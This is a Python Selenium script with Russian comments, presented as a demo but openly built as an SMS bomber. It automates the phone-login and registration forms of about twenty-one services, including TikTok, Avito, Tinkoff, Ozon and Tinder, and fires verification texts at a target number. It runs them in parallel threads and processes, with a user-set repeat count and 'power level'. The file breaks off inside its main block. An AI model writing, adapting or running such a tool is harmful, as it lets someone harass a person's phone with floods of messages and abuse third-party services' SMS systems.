# для демонстрации Силениума Напишем простой СМС бомбер
from selenium import webdriver
import time
import threading
import multiprocessing



# Как гласит правило - не повторяй свой код - поэтому сначала напишем простую функцию запуска драйвера
def SMS_bomber_WebDriver():
    driver = webdriver.Chrome("C:/Users/Denis/Desktop/smsbomber/chromedriver.exe")
    # Делаем запущенный браузер в полное окно
    driver.maximize_window()
    return driver;

# Далее будут функции для сервисов , которые будут принимать номер телефона
# Первый сервис который будет слать смс - ТикТок
def SMS_bomber_TikTok(number):
# Запускаем драйвер
    driver = SMS_bomber_WebDriver()
# Переходим на сайт
    driver.get('https://www.tiktok.com/ru')
# ищем элемент , куда надо вставлять номер
    try:
        # Проверяем , туда ли зашли
        assert "Отправьте себе СМС со ссылкой для загрузки TikTok" in driver.page_source
        # ищем поле элемента для вставки номера
        element = driver.find_element_by_xpath('//*[@id="main"]/div[3]/div[1]/div[1]/div[1]/form/input[2]')
        time.sleep(5)
        element.click()
        # Вводим наш номер
        element.send_keys(number)
        time.sleep(5)
        # Нажимием кнопку отправить
        button = driver.find_element_by_xpath('//*[@id="main"]/div[3]/div[1]/div[1]/div[1]/form/button')
        button.click()
        print('TikTok - Успешно')
        time.sleep(5)
    except:
        print('Неудачно')
    finally:
        driver.close()

# Второй сервис - Юла
def SMS_bomber_Youla(number):
    # Запускаем драйвер
    driver = SMS_bomber_WebDriver()
    driver.get('https://youla.ru')
    # ищем элемент , куда надо вставлять номер
    try:
        # Проверяем , туда ли зашли
        assert "Юла" in driver.page_source
        # ищем поле элемента для вставки номера
        time.sleep(2)
        # Поскольку сервиса немного упоротая система - тут много тыканья по кнопкам
        time.sleep(3)
        # Заходим на глагне , ищем кнопку сообщения
        button_message = driver.find_element_by_xpath('/html/body/div[2]/div[1]/div[4]/header/div[1]/section/nav/ul/li[4]/a')
        button_message.click()
        time.sleep(3)
        # Ищем поля для вставки номера телефона , и кнопку отправить смс
        field = driver.find_element_by_xpath('/html/body/div[2]/div[2]/div[9]/div/span/div/div/div[1]/div/div[2]/main/div/div[2]/div[1]/div/input')
        field.click()
        time.sleep(5)
        field.send_keys(number)
        time.sleep(2)
        button_continue = driver.find_element_by_xpath('/html/body/div[2]/div[2]/div[9]/div/span/div/div/div[1]/div/div[2]/main/div/div[2]/button')
        button_continue.click()
        time.sleep(5)
        print('Юла - Успешно')

    except:
        print('Юла - Неудачно')
    finally:
        driver.close()
# Третий сервис - Авито
def SMS_bomber_Avito(number):
    driver = SMS_bomber_WebDriver()
    driver.get('https://www.avito.ru/#registration')
    # ищем элемент , куда надо вставлять номер
    try:
        # Проверяем , туда ли зашли
        assert "Авито" in driver.page_source
        # ищем поле элемента для вставки номера
        time.sleep(2)
        field = driver.find_element_by_xpath('/html/body/div[5]/div/div/div/div/span/div/div[1]/form/div[3]/div/div/div/label/input')
        field.click()
        # Вставляем номер
        field.send_keys(number)
        time.sleep(2)
        # ищем кнопку чтоб отправить смс
        button = driver.find_element_by_xpath('/html/body/div[5]/div/div/div/div/span/div/div[1]/form/div[5]/div/div/div/div/button')
        button.click()
        time.sleep(2)
        print('Авито - Успешно')
    except:
        print('Авито - Неудачно')
    finally:
        driver.close()


#Четвертый сервис - Wowworks
def SMS_bomber_Wowworks(number):
    driver = SMS_bomber_WebDriver()
    driver.get('https://wowworks.ru/login/register')
    # ищем элемент , куда надо вставлять номер
    try:
        # Проверяем , туда ли зашли
        assert "Wowworks" in driver.page_source
        # ищем поле элемента для вставки номера
        time.sleep(2)
        field = driver.find_element_by_xpath('//*[@id="root"]/div[2]/div[1]/div[2]/div/form/div[1]/input')
        field.click()
        time.sleep(3)
        # Вставляем номер
        field.send_keys('7' + number)
        time.sleep(3)
        # ищем кнопки отправки
        button = driver.find_element_by_xpath('//*[@id="root"]/div[2]/div[1]/div[2]/div/form/div[3]/button')
        button.click()
        time.sleep(3)
        print('Wowworks - Успешно')
    except:
        print('Wowworks - Неудачно')
    finally:
        driver.close()
# Сервис- Worki
def SMS_bomber_Worki(number):
    driver = SMS_bomber_WebDriver()
    driver.get('https://worki.ru/hr/login/phone?backUrl=/hr/&origin=headerButton')
# ищем элемент , куда надо вставлять номер
    try:
        # Проверяем , туда ли зашли
        assert "Worki" in driver.page_source
        time.sleep(5)
        field = driver.find_element_by_xpath('//*[@id="field_id1"]')
        field.click()
        field.send_keys(number)
        time.sleep(5)
        button = driver.find_element_by_xpath('//*[@id="landingAppRoot"]/div/div[1]/div/div[2]/form/button/span/span')
        button.click()
        time.sleep(5)
        print('Worki - Успешно')
    except:
        print('Worki - Неудачно')
    finally:
        driver.close()

# Еще один сервис - вайФай метро
def SMS_bomber_CabinetWiFi(number):
    driver = SMS_bomber_WebDriver()
    driver.get('https://cabinet.wi-fi.ru')
# ищем элемент , куда надо вставлять номер
    try:
        # Проверяем , туда ли зашли
        assert "WI-FI.RU Кабинет" in driver.page_source
        time.sleep(5)
        # Тут немного сложнее - ибо название плавующие, поэтому берем фулл икспатч
        field = driver.find_element_by_xpath('/html/body/section/main/div/div[1]/div/div/div/div/input')
        field.click()
        field.send_keys(number)
        time.sleep(5)
        button = driver.find_element_by_xpath('/html/body/section/main/div/div[2]/div/button')
        button.click()
        time.sleep(5)
        print('WI-FI.RU Кабинет - Успешно')
    except:
        print('WI-FI.RU Кабинет - Неудачно')
    finally:
        driver.close()

# ВСК Страхование
def SMS_bomber_VSK(number):
    driver = SMS_bomber_WebDriver()
    driver.get('https://shop.vsk.ru')
# ищем элемент , куда надо вставлять номер
    try:
        # Проверяем , туда ли зашли
        assert "ВСК страхование" in driver.page_source
        time.sleep(5)
        # Сначала заходим на страницу аунтефикации
        field = driver.find_element_by_xpath('//*[@id="start"]/div[1]/main/ui-header/div/a[2]/span')
        field.click()
        time.sleep(3)
        field1 = driver.find_element_by_xpath('/html/body/div[2]/div[2]/div/mat-dialog-container/ng-component/authorization/form/div[3]/div/input')
        field1.click()
        field1.send_keys(number)
        time.sleep(5)
        button = driver.find_element_by_xpath('/html/body/div[2]/div[2]/div/mat-dialog-container/ng-component/authorization/form/div[4]/button')
        button.click()
        time.sleep(5)
        print('ВСК - Успешно')
    except:
        print('ВСК - Неудачно')
    finally:
        driver.close()

# ВСК Страхование
def SMS_bomber_VSK(number):
    driver = SMS_bomber_WebDriver()
    driver.get('https://shop.vsk.ru')
# ищем элемент , куда надо вставлять номер
    try:
        # Проверяем , туда ли зашли
        assert "ВСК страхование" in driver.page_source
        time.sleep(5)
        # Сначала заходим на страницу аунтефикации
        field = driver.find_element_by_xpath('//*[@id="start"]/div[1]/main/ui-header/div/a[2]/span')
        field.click()
        time.sleep(3)
        field1 = driver.find_element_by_xpath('/html/body/div[2]/div[2]/div/mat-dialog-container/ng-component/authorization/form/div[3]/div/input')
        field1.click()
        field1.send_keys(number)
        time.sleep(5)
        button = driver.find_element_by_xpath('/html/body/div[2]/div[2]/div/mat-dialog-container/ng-component/authorization/form/div[4]/button')
        button.click()
        time.sleep(5)
        print('ВСК - Успешно')
    except:
        print('ВСК - Неудачно')
    finally:
        driver.close()

# Тинькоф банк
def SMS_bomber_Tinkoff(number):
    driver = SMS_bomber_WebDriver()
    driver.get('https://www.tinkoff.ru/login/')
# ищем элемент , куда надо вставлять номер
    try:
        # Проверяем , туда ли зашли
        assert "Тинькофф Банк" in driver.page_source
        time.sleep(5)
        # Находим поле ввода
        field = driver.find_element_by_xpath('/html/body/div[1]/div/div/div/div[1]/div[2]/div/div[3]/div/div[2]/div[1]/div[2]/div/div/div/div[1]/form/div[1]/div/div/div/div/label/div[1]/input')
        field.click()
        # а вот тут - надо вводить с восьмеркой
        field.send_keys('8' + number)
        time.sleep(5)
        button = driver.find_element_by_xpath('/html/body/div[1]/div/div/div/div[1]/div[2]/div/div[3]/div/div[2]/div[1]/div[2]/div/div/div/div[1]/form/div[2]/div/div/span/button')
        button.click()
        time.sleep(5)
        print('Тинькофф Банк - Успешно')
    except:
        print('Тинькофф Банк - Неудачно')
    finally:
        driver.close()

# Тиндер
def SMS_bomber_Tinder(number):
    driver = SMS_bomber_WebDriver()
    driver.get('https://tinder.com/?utm_source=gotinder-nav-login')
    try:
        # Проверяем , туда ли зашли
        assert "Tinder" in driver.page_source
        time.sleep(5)
        # динамические кннопки , поэтому ищем по контнту кнопки
        button_phone = driver.find_element_by_xpath("//*[contains(text(), 'Войти с помощью номера телефона')]")
        button_phone.click()
        time.sleep(5)
        # # ищем элемент , куда надо вставлять номер
        field = driver.find_element_by_xpath('/html/body/div[2]/div/div/div[1]/div[2]/div/input')
        field.click()
        field.send_keys(number)
        time.sleep(5)
        button = driver.find_element_by_xpath('/html/body/div[2]/div/div/div[1]/button/span')
        button.click()
        print('Tinder - Успешно')
    except:
        try:
            button_other_options = driver.find_element_by_xpath("//*[contains(text(), 'Другие Варианты')]")
            button_other_options.click()
            time.sleep(5)
            button_phone = driver.find_element_by_xpath("//*[contains(text(), 'Войти с помощью номера телефона')]")
            button_phone.click()
            time.sleep(5)
            # # ищем элемент , куда надо вставлять номер
            field = driver.find_element_by_xpath('/html/body/div[2]/div/div/div[1]/div[2]/div/input')
            field.click()
            field.send_keys(number)
            time.sleep(5)
            button = driver.find_element_by_xpath('/html/body/div[2]/div/div/div[1]/button/span')
            button.click()
            print('Tinder - Успешно')
        except:
            print('Tinder - Неудачно')
    finally:
        driver.close()

# Тануки
def SMS_bomber_Tanuki(number):
    driver = SMS_bomber_WebDriver()
    driver.get('https://www.tanuki.ru')
    try:
        # Проверяем , туда ли зашли
        assert "Тануки" in driver.page_source
        time.sleep(5)
        # Здесь сначала щелкаем на иконку, а потом ищем поле
        button1 = driver.find_element_by_xpath('//*[@id="header"]/div/div/nav/ul/li[7]/button')
        button1.click()
        time.sleep(3)
        # Здесь щелкаем по полю и вставляем номер
        field = driver.find_element_by_xpath('/html/body/div[4]/div/div/div/div[2]/div/form/div[1]/input')
        field.click()
        field.send_keys(number)
        time.sleep(3)
        button = driver.find_element_by_xpath('/html/body/div[4]/div/div/div/div[2]/div/form/div[2]/button')
        button.click()
        time.sleep(3)
        print('Тануки - Успешно')
    except:
        print('Тануки - Неудачно')
    finally:
        driver.close()

# какой то странный сервис - shopandshow.ru
def SMS_bomber_Shopandshow(number):
    driver = SMS_bomber_WebDriver()
    driver.get('https://shopandshow.ru/')
    try:
        # Проверяем , туда ли зашли
        assert "Show" in driver.page_source
        time.sleep(5)
        # Ищеим кнопку , нажимаем его
        button1 = driver.find_element_by_xpath('/html/body/header/div[1]/div/div/div[6]/div/div[2]/a')
        button1.click()
        time.sleep(5)
        field = driver.find_element_by_xpath('//*[@id="authbyphone-identity"]')
        field.click()
        field.send_keys(number)
        button1 = driver.find_element_by_xpath('//*[@id="auth-form-by-phone"]/div[2]/p/a')
        button1.click()
        time.sleep(5)
        field = driver.find_element_by_xpath('/html/body/div[4]/div/div/div[2]/div/div[1]/form/div[2]/p/a')
        field.click()
        time.sleep(3)
        print('Shopandshow - Успешно')
    except:
        print('Shopandshow - Неудачно')
    finally:
        driver.close()


# сервис еды - sberfood.ru
def SMS_bomber_Sberfood(number):
    driver = SMS_bomber_WebDriver()
    driver.get('https://app.sberfood.ru/auth?redirect=%2F')
    try:
        # Проверяем , туда ли зашли
        assert "Приложение для оплаты счета в кафе и ресторанах. Чаевые без наличных, разделения счёта, бронирование и предзаказ." in driver.page_source
        time.sleep(5)
        field = driver.find_element_by_xpath('//*[@id="app"]/div[2]/div[2]/main/form/div[1]/div/input')
        field.click()
        field.send_keys(number)
        time.sleep(3)
        button = driver.find_element_by_xpath('//*[@id="app"]/div[2]/div[2]/main/form/div[2]/button[1]')
        button.click()
        time.sleep(3)
        print('SberFood - Успешно')
    except:
        print('SberFood - Неудачно')
    finally:
        driver.close()

# Еще одна недопицерия - FoodBand
def SMS_bomber_FoodBand(number):
    driver = SMS_bomber_WebDriver()
    driver.get('https://foodband.ru')
    try:
        # Проверяем , туда ли зашли
        assert "FoodBand" in driver.page_source
        time.sleep(5)
        # Тут сначала клацаем на поле входа - а потом всплывает поле.
        button1 = driver.find_element_by_xpath('//*[@id="main"]/header/div[1]/div[3]/div/p/a')
        button1.click()
        time.sleep(3)
        # Теперь ищем поле ввода
        field = driver.find_element_by_xpath('//*[@id="main"]/div[6]/div/form/input[1]')
        field.click()
        field.send_keys(number)
        time.sleep(3)
        # Теперь клацаем кнопку входа
        button2 = driver.find_element_by_xpath('//*[@id="main"]/div[6]/div/form/button[2]')
        button2.click()
        time.sleep(3)
        print('FoodBand - Успешно')
    except:
        print('FoodBand - Неудачно')
    finally:
        driver.close()

# Ювелирный салон - SUNLIGHT
def SMS_bomber_Sunlight(number):
    driver = SMS_bomber_WebDriver()
    driver.get('https://sunlight.net/profile/login/?next=/')
    try:
        # Проверяем , туда ли зашли
        assert "SUNLIGHT" in driver.page_source
        time.sleep(5)
        # Вводим номер
        field = driver.find_element_by_xpath('//*[@id="profile-login-popup-reg-phone-input"]')
        field.click()
        field.send_keys(number)
        time.sleep(3)
        # Нажимаем на кнопку
        button = driver.find_element_by_xpath('//*[@id="profile-login-popup-view-button"]')
        button.click()
        time.sleep(3)
        print('SUNLIGHT - Успешно')
    except:
        print('SUNLIGHT - Неудачно')
    finally:
        driver.close()

# Надо больше еды - Ollis
def SMS_bomber_Ollis(number):
    driver = SMS_bomber_WebDriver()
    driver.get('https://www.ollis.ru')
    try:
        # Проверяем , туда ли зашли
        assert "Ollis" in driver.page_source
        time.sleep(5)
        # Тут сначала клацаем на поле входа - а потом всплывает поле.
        button1 = driver.find_element_by_xpath('//*[@id="app"]/div/header/div/div[4]/div[2]/button')
        button1.click()
        time.sleep(3)
        # Теперь ищем поле ввода
        field = driver.find_element_by_xpath('/html/body/div[2]/div[1]/form/div/div[2]/div/div/div/div[2]/label/input')
        field.click()
        # Важный момент - тут уже есть девятка. значит укорачиваем наш номер - убираем первый символ
        field.send_keys(number[1:])
        time.sleep(3)
        # Теперь клацаем кнопку входа
        button2 = driver.find_element_by_xpath('/html/body/div[2]/div[1]/form/div/div[3]/button[1]')
        button2.click()
        time.sleep(3)
        print('Ollis - Успешно')
    except:
        print('Ollis - Неудачно')
    finally:
        driver.close()

# Уборка дома - Qlean SSO
def SMS_bomber_Qlean(number):
    driver = SMS_bomber_WebDriver()
    driver.get('https://qlean.ru/sso?redirectUrl=https://qlean.ru/')
    try:
        # Проверяем , туда ли зашли
        assert "Qlean" in driver.page_source
        time.sleep(3)
        # ищем поле
        field = driver.find_element_by_xpath('//*[@id="__next"]/div[4]/form/div/div/div[1]/div[1]/div/input')
        field.click()
        field.send_keys(number)
        time.sleep(3)
        button = driver.find_element_by_xpath('//*[@id="__next"]/div[4]/form/div/div/div[2]/button/div')
        button.click()
        print('Qlean - Успешно')
    except:
        print('Qlean - Неудачно')
    finally:
        driver.close()

# Ozon - нет не тот который видеоблогер, а тот который русский амазон
def SMS_bomber_Ozon(number):
    driver = SMS_bomber_WebDriver()
    driver.get('https://www.ozon.ru')
    try:
        # Проверяем , туда ли зашли
        assert "Ozon" in driver.page_source
        time.sleep(3)
        # ищем Нужную кнопку
        button1 = driver.find_element_by_xpath('/html/body/div[1]/div/div[1]/div[3]/div[1]/div[2]/div[2]/div/button')
        button1.click()
        time.sleep(3)
        field = driver.find_element_by_xpath('/html/body/div[3]/div/div/div/div/div/div/div/div/div[2]/label/div/input')
        field.click()
        field.send_keys(number)
        time.sleep(3)
        button2 = driver.find_element_by_xpath('/html/body/div[3]/div/div/div/div/div/div/div/div/div[3]/button/div')
        button2.click()
        print('Ozon - Успешно')
    except:
        print('Ozon - Неудачно')
    finally:
        driver.close()


# Rutube - это такой русский ютуб
def SMS_bomber_Rutube(number):
    driver = SMS_bomber_WebDriver()
    driver.get('https://rutube.ru')
    try:
        # Проверяем , туда ли зашли
        assert "Rutube" in driver.page_source
        # Тут надо очень долго делать последовательность
        # Скрываем всплывающее окно
        time.sleep(3000)
        button_cookies = driver.find_element_by_xpath('/html/body/div/div/div[8]/div/button')
        button_cookies.click()
        # Ищем вход
        time.sleep(3)
        button_singup = driver.find_element_by_xpath('/html/body/div/div/div[1]/div/div/div[1]/div[3]/div/div[1]/div[3]/div/div[1]/div[2]')
        button_singup.click()
        time.sleep(3)
        # ищем регистрацию
        button_registration = driver.find_element_by_xpath('/html/body/div/div/div[3]/div[1]/div/header/div/div[2]/span')
        button_registration.click()
        time.sleep(3)
        # А теперь заполняем поле , добавляя цифру 7
        field = driver.find_element_by_xpath('/html/body/div[1]/div/div[3]/div[1]/div/div[2]/div/div[1]/form/div[1]/div[2]/input')
        field.click()
        field.send_keys('7' + number)
        time.sleep(3)
        # Еще один очень важный момент - кнопощки. Дело в том , что они не нажимаются обычным кликом. Все дело в динамическом ДжаваСкрипт. Поэтому надо воспользоваться альтернативным способом нажатия.
        checkbox_consent = driver.find_element_by_xpath('/html/body/div/div/div[3]/div[1]/div/div[2]/div/div[1]/form/div[2]/label/input')
        time.sleep(1)
        webdriver.ActionChains(driver).move_to_element(checkbox_consent).click(checkbox_consent).perform()
        # И вторая кнопочка - Ищем по икспачу и нажимаем.
        checkbox_accept = driver.find_element_by_xpath('/html/body/div/div/div[3]/div[1]/div/div[2]/div/div[1]/form/div[3]/label/input')
        time.sleep(1)
        webdriver.ActionChains(driver).move_to_element(checkbox_accept).click(checkbox_accept).perform()
        time.sleep(1)

        # Отправляем СМС
        button_send = driver.find_element_by_xpath('/html/body/div[1]/div/div[3]/div[1]/div/div[2]/div/div[1]/form/div[5]/button')
        button_send.click()
        time.sleep(3)
        print('Rutube - Успешно')
    except:
        print('Rutube - Неудачно')
    finally:
        driver.close()

# МВидео , которому не все равно- почему бы и нет
def SMS_bomber_Mvideo(number):
    driver = SMS_bomber_WebDriver()
    driver.get('https://www.mvideo.ru/login')
    try:
        # Проверяем , туда ли зашли
        assert "М.Видео" in driver.page_source
        time.sleep(3)
        # Тут будет немного странно - сначала закрываем всплывающее окно. оно очень сильно мешает - иначе не выдает действия  с элементами
        button_close = driver.find_element_by_xpath('/html/body/div[2]/div/div[5]/div[1]/span')
        button_close.click()
        time.sleep(3)
        # Тут все не так просто как кажется - сначала делаем поиск поля, нажимаем его
        field = driver.find_element_by_xpath('//*[@id="phone-verification-submit"]')
        field.click()
        # Акивируется скрытое поле , и его просто так не поймать , поэтому сразу вводим в него цифры
        field1 = driver.find_element_by_xpath('/html/body/div[2]/div/div[3]/div/div/div[2]/div[3]/div[1]/form/div/div[1]/div/input[1]').send_keys(number)
        time.sleep(3)
        button = driver.find_element_by_xpath('//*[@id="phone-verification-submit"]/div/div[3]/button')
        button.click()
        time.sleep(3)
        print('МВидео - Успешно')
    except:
        print('МВидео - Неудачно')
    finally:
        driver.close()

# Mousam - Какой то сервис для мойки машин
def SMS_bomber_Mousam(number):
    driver = SMS_bomber_WebDriver()
    driver.get('https://mousam.ru/checkphone')
    try:
        # Проверяем , туда ли зашли
        assert "Авторизация" in driver.page_source
        time.sleep(3)
        field = driver.find_element_by_xpath('//*[@id="content"]/div/div/div[5]/div[2]/form[1]/div[2]/input[1]')
        field.click()
        field.send_keys(number)
        time.sleep(2)
        button = driver.find_element_by_xpath('//*[@id="checkphone"]')
        button.click()
        time.sleep(3)
        print('Mousam - Успешно')
    except:
        print('Mousam - Неудачно')
    finally:
        driver.close()

# Лента , такая питерская и не только , пятерочка
def SMS_bomber_Lenta(number):
    driver = SMS_bomber_WebDriver()
    driver.get('https://lenta.com/authentication/login/new-card/')
    try:
        # Проверяем , туда ли зашли
        assert "Лента" in driver.page_source
        time.sleep(3)
        # Закрываем всплывающие окно внизу. это важно
        button_window = driver.find_element_by_xpath('/html/body/div[2]/div/div/div/main/div[2]/div/button/div[1]')
        button_window.click()
        time.sleep(2)
        # А тут очень интересно - сайт адаптировали против ботов - и нельзя удерживать кнопку в памяти - т.к. сайт сбрасывает курсор
        # что ж - реализация не такая красивая- мы находим поле вставки , щелкаем его
        field = driver.find_element_by_xpath(
            '/html/body/div[2]/div/div/div/main/div[1]/div/div/div/form/div[1]/div[1]/div[1]')
        field.click()
        # Мы нашли поле , и страница изменяется. ищем сразу поле вставки и всавляем
        field2 = driver.find_element_by_xpath(
            '/html/body/div[2]/div/div/div/main/div[1]/div/div/div/form/div[1]/div[1]/div[1]/input').send_keys(
            '8' + number[1:])
        time.sleep(2)
        button = driver.find_element_by_xpath(
            '/html/body/div[2]/div/div/div/main/div[1]/div/div/div/form/div[2]/button').click()
        time.sleep(3)
        print('Лента - Успешно')
    except:
        print('Лента - Неудачно')
    finally:
        driver.close()

# Золотая Корона
def SMS_bomber_Korona(number):
    driver = SMS_bomber_WebDriver()
    driver.get('https://koronapay.com/transfers/online/login/')
    try:
        # Проверяем , туда ли зашли
        assert "Золотая Корона" in driver.page_source
        time.sleep(3)
        field = driver.find_element_by_xpath('//*[@id="loginPage_otp_phoneInput"]')
        field.click()
        field.send_keys(number)
        time.sleep(2)
        button = driver.find_element_by_xpath('//*[@id="loginPage_otp_sendButton"]')
        button.click()
        time.sleep(3)
        print('Золотая Корона - Успешно')
    except:
        print('Золотая Корона - Неудачно')
    finally:
        driver.close()

# Карусель
def SMS_bomber_Karusel(number):
    driver = SMS_bomber_WebDriver()
    driver.get('https://karusel.ru')
    try:
        # Проверяем , туда ли зашли
        assert "Карусель" in driver.page_source
        time.sleep(3)
        # Тут есть всплывающее окно, которое надо закрыть
        # ищем кнопку и нажимает ее
        button_location = driver.find_element_by_xpath('//*[@id="city-confirmation"]/div[2]/a[1]')
        button_location.click()
        # Жмякаем на кнопочку
        button1 = driver.find_element_by_xpath('/html/body/div/div/div/div[1]/div/div[2]/div/div[3]/div/a[2]')
        button1.click()
        time.sleep(3)
        field = driver.find_element_by_xpath('/html/body/div/div/div/div[5]/div/div/div[2]/div[2]/fieldset/div/input')
        field.click()
        field.send_keys(number[1:])
        time.sleep(2)
        # Тут надо искать чек бокс - и тут надо быть аккуратнее
        # checkbox = driver.find_element_by_xpath('//*[@id="__layout"]/div/div[5]/div/div/div[2]/div[2]/fieldset[2]/div[2]/label')
        # checkbox.click()
        # button = driver.find_element_by_xpath('//*[@id="__layout"]/div/div[5]/div/div/div[2]/div[2]/div[2]/div/button')
        # button.click()
        # time.sleep(3)
        print('Карусель - Успешно')
    except:
        print('Карусель - Неудачно')
    finally:
        driver.close()
# Однокласники

def SMS_bomber_Ok(number):
    driver = SMS_bomber_WebDriver()
    driver.get('https://ok.ru/dk?st.cmd=anonymRegistrationEnterPhone')
    try:
        # Проверяем , туда ли зашли
        assert "Одноклассники" in driver.page_source
        # Ищем поле
        time.sleep(3)
        field = driver.find_element_by_xpath('//*[@id="field_phone"]')
        field.click()
        field.send_keys(number)
        time.sleep(2)
        # Кнопочка
        button = driver.find_element_by_xpath('//*[@id="hook_Block_AnonymRegistrationEnterPhone"]/div/div[1]/div[2]/div/form/div[2]/input')
        button.click()
        time.sleep(3)
        print('Одноклассники - Успешно')
    except:
        print('Одноклассники - Неудачно')
    finally:
        driver.close()

def SMS_bomber_Mail(number):
# Запускаем драйвер
    driver = SMS_bomber_WebDriver()
# Переходим на сайт
    driver.get('https://cloud.mail.ru/home/')
# ищем элемент , куда надо вставлять номер
    try:
        # Проверяем , туда ли зашли
        assert "Облачный сервис Mail.ru" in driver.page_source
        # ищем поле элемента для вставки номера
        element = driver.find_element_by_xpath('//*[@id="phone"]')
        time.sleep(5)
        element.click()
        # Вводим наш номер
        element.send_keys('7'+ number)
        time.sleep(5)
        # Нажимием кнопку отправить
        button = driver.find_element_by_xpath('/html/body/div/div/div[2]/div[4]/div/div[3]/form/div/button')
        button.click()
        print('Mail - Успешно')
        time.sleep(5)
    except:
        print('Mail - Неудачно')
    finally:
        driver.close()
# /////////////////////////////////////////////////////////////////////////////////////////////////////////
# Итак , мы написали фунции отправки СМС для сервисов. Теперь обьедим их.


def SMS_bomber_all_service1(number):
    print('Начинаем отправку по всем сервисам')
    SMS_bomber_TikTok(number)
    print('Сервисы закончились')

def SMS_bomber_all_service11(number):
    print('Начинаем отправку по всем сервисам')
    SMS_bomber_Youla(number)
    print('Сервисы закончились')

def SMS_bomber_all_service2(number):
    print('Начинаем отправку по всем сервисам')
    SMS_bomber_CabinetWiFi(number)
    print('Сервисы закончились')

def SMS_bomber_all_service12(number):
    print('Начинаем отправку по всем сервисам')
    SMS_bomber_Wowworks(number)
    print('Сервисы закончились')


def SMS_bomber_all_service3(number):
    print('Начинаем отправку по всем сервисам')
    SMS_bomber_VSK(number)
    print('Сервисы закончились')

def SMS_bomber_all_service13(number):
    print('Начинаем отправку по всем сервисам')
    SMS_bomber_Tinkoff(number)
    print('Сервисы закончились')

def SMS_bomber_all_service4(number):
    print('Начинаем отправку по всем сервисам')
    SMS_bomber_Tanuki(number)
    print('Сервисы закончились')

def SMS_bomber_all_service14(number):
    print('Начинаем отправку по всем сервисам')
    SMS_bomber_Sberfood(number)
    print('Сервисы закончились')

def SMS_bomber_all_service5(number):
    print('Начинаем отправку по всем сервисам')
    SMS_bomber_FoodBand(number)
    print('Сервисы закончились')

def SMS_bomber_all_service15(number):
    print('Начинаем отправку по всем сервисам')
    SMS_bomber_Sunlight(number)
    print('Сервисы закончились')

def SMS_bomber_all_service6(number):
    print('Начинаем отправку по всем сервисам')
    SMS_bomber_Ollis(number)
    print('Сервисы закончились')

def SMS_bomber_all_service16(number):
    print('Начинаем отправку по всем сервисам')
    SMS_bomber_Shopandshow(number)
    print('Сервисы закончились')

def SMS_bomber_all_service7(number):
    print('Начинаем отправку по всем сервисам')
    SMS_bomber_Qlean(number)
    print('Сервисы закончились')

def SMS_bomber_all_service17(number):
    print('Начинаем отправку по всем сервисам')
    SMS_bomber_Ozon(number)
    print('Сервисы закончились')

def SMS_bomber_all_service8(number):
    print('Начинаем отправку по всем сервисам')
    SMS_bomber_Lenta(number)
    print('Сервисы закончились')

def SMS_bomber_all_service18(number):
    print('Начинаем отправку по всем сервисам')
    SMS_bomber_Korona(number)
    print('Сервисы закончились')

def SMS_bomber_all_service9(number):
    print('Начинаем отправку по всем сервисам')
    SMS_bomber_Karusel(number)
    print('Сервисы закончились')

def SMS_bomber_all_service19(number):
    print('Начинаем отправку по всем сервисам')
    SMS_bomber_Mousam(number)
    print('Сервисы закончились')

def SMS_bomber_all_service10(number):
    print('Начинаем отправку по всем сервисам')
    SMS_bomber_Ok(number)
    print('Сервисы закончились')

def SMS_bomber_all_service20(number):
    print('Начинаем отправку по всем сервисам')
    SMS_bomber_Mail(number)
    print('Сервисы закончились')

def SMS_bomber_all_service21(number):
    print('Начинаем отправку по всем сервисам')
    SMS_bomber_Tinder(number)
    print('Сервисы закончились')

def Sms_multi_1(number):

        t1 = threading.Thread(target=SMS_bomber_all_service1, args=(number,))
        t2 = threading.Thread(target=SMS_bomber_all_service2, args=(number,))
        t3 = threading.Thread(target=SMS_bomber_all_service3, args=(number,))
        t4 = threading.Thread(target=SMS_bomber_all_service4, args=(number,))

        t1.start()
        t2.start()
        t3.start()
        t4.start()

        t1.join()
        t2.join()
        t3.join()
        t4.join

def Sms_multi_2(number):

        t5 = threading.Thread(target=SMS_bomber_all_service5, args=(number,))
        t6 = threading.Thread(target=SMS_bomber_all_service6, args=(number,))
        t7 = threading.Thread(target=SMS_bomber_all_service7, args=(number,))
        t8 = threading.Thread(target=SMS_bomber_all_service8, args=(number,))

        t5.start()
        t6.start()
        t7.start()
        t8.start()

        t5.join()
        t6.join()
        t7.join()
        t8.join()


def Sms_multi_3(number):

        t9 = threading.Thread(target=SMS_bomber_all_service9, args=(number,))
        t10 = threading.Thread(target=SMS_bomber_all_service10, args=(number,))
        t11 = threading.Thread(target=SMS_bomber_all_service11, args=(number,))
        t12 = threading.Thread(target=SMS_bomber_all_service12, args=(number,))

        
        t9.start()
        t10.start()
        t11.start()
        t12.start

        
        t9.join()
        t10.join()
        t11.join()
        t12.join()

def Sms_multi_4(number):

        t13 = threading.Thread(target=SMS_bomber_all_service13, args=(number,))
        t14 = threading.Thread(target=SMS_bomber_all_service14, args=(number,))
        t15 = threading.Thread(target=SMS_bomber_all_service15, args=(number,))
        t16 = threading.Thread(target=SMS_bomber_all_service16, args=(number,))

        t13.start()
        t14.start()
        t15.start()
        t16.start()

        t13.join()
        t14.join()
        t15.join()
        t16.join()


def Sms_multi_5(number):


        t17 = threading.Thread(target=SMS_bomber_all_service17, args=(number,))
        t18 = threading.Thread(target=SMS_bomber_all_service18, args=(number,))
        t19 = threading.Thread(target=SMS_bomber_all_service19, args=(number,))
        t20 = threading.Thread(target=SMS_bomber_all_service20, args=(number,))
        t21 = threading.Thread(target=SMS_bomber_all_service21, args=(number,))

        t17.start()
        t18.start()
        t19.start()
        t20.start()
        t21.start()

        t17.join()
        t18.join()
        t19.join()
        t20.join()
        t21.join()

if __name__ == "__main__":
    
    print('СМС бомбер. \n Чтоб Заспамить номер телефона , введите его, без +7  ')
    number = input()
    print('введен номер', number)
    print('Введите количество повторов')
    raz = input()
    print('введено повторов ', raz)
    print('Введите уровень мощности дд от 1 до 5 ')
    ff = input()
    print('введенный уровень ', ff)
    ff=int(ff)



    if ff==1:
        raz=int(raz)
        for i in range(raz):

                p1 = multiprocessing.Process(target=Sms_multi_1, args=(number,))

                p1.start()

                p1.join()

    if ff==2:
        raz=int(raz)
        for i in range(raz):

                p1 = multiprocessing.Process(target=Sms_multi_1, args=(number,))
                p2 = multiprocessing.Process(target=Sms_multi_2, args=(number,))

                p1.start()
                p2.start()

                p1.join()
                p2.join()


    if ff==3:
        raz=int(raz)
        for i in range(raz):

                p1 = multiprocessing.Process(target=Sms_multi_1, args=(number,))
                p2 = multiprocessing.Process(target=Sms_multi_2, args=(number,))
                p3 = multiprocessing.Process(target=Sms_multi_3, args=(number,))

                p1.start()
